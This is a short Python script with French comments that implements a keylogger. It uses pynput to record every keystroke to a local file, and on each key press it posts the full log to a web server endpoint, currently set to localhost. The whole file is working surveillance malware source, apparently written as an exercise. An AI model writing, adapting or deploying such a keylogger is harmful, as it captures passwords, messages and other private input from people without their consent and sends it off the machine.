import logging
from pynput.keyboard import Key, Listener
import requests

# Configuration de l'enregistrement des logs avec encodage UTF-8
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s", encoding="utf-8")

# URL du serveur Web pour recevoir les logs
SERVER_URL = 'http://127.0.0.1:5000/receive_logs'

# Variable pour suivre l'état des touches de modification
modifier_keys = {Key.shift, Key.shift_r, Key.alt, Key.alt_r, Key.ctrl, Key.ctrl_r}
current_modifiers = set()

# Fonction pour convertir les touches spéciales et de modification en chaînes lisibles
def key_to_string(key):
    if key == Key.space:
        return " "
    elif key == Key.enter:
        return "[ENTER]"
    elif key == Key.backspace:
        return "[BACKSPACE]"
    elif key == Key.tab:
        return "[TAB]"
    elif key == Key.esc:
        return "[ESC]"
    elif key == Key.shift or key == Key.shift_r:
        return "[SHIFT]"
    elif key == Key.ctrl or key == Key.ctrl_r:
        return "[CTRL]"
    elif key == Key.alt or key == Key.alt_r:
        return "[ALT]"
    elif hasattr(key, 'char') and key.char:
        return key.char
    else:
        return f"[{str(key)}]"

# Fonction appelée à chaque pression de touche
def on_press(key):
    global current_modifiers
    if key in modifier_keys:
        current_modifiers.add(key)
    else:
        # Vérifier si la touche Shift est pressée
        if Key.shift in current_modifiers:
            key_string = key_to_string(key).upper()
        else:
            key_string = key_to_string(key)
        logging.info(key_string)

        # Envoyer les logs au serveur Web
        try:
            with open('keylog.txt', 'r', encoding='utf-8') as file:
                logs = file.read()
                response = requests.post(SERVER_URL, data={'logs': logs})
                if response.status_code == 200:
                    print('Logs envoyés avec succès!')
                else:
                    print('Échec de l\'envoi des logs.')
        except Exception as e:
            print('Erreur lors de l\'envoi des logs:', e)

# Fonction appelée à chaque relâchement de touche
def on_release(key):
    global current_modifiers
    if key in modifier_keys:
        current_modifiers.discard(key)

# Commencer à écouter les frappes de clavier
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
